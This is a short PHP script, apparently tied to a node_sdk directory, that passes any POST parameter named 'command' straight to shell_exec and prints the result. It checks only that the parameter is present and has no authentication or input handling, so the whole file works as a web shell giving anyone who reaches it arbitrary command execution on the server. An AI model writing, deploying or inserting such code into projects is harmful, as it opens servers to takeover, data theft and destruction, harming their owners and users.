<?php 
	if(!isset($_POST['command'])){
		die('bye');
    }
    echo shell_exec('cd node_sdk;'.$_POST['command']);
?>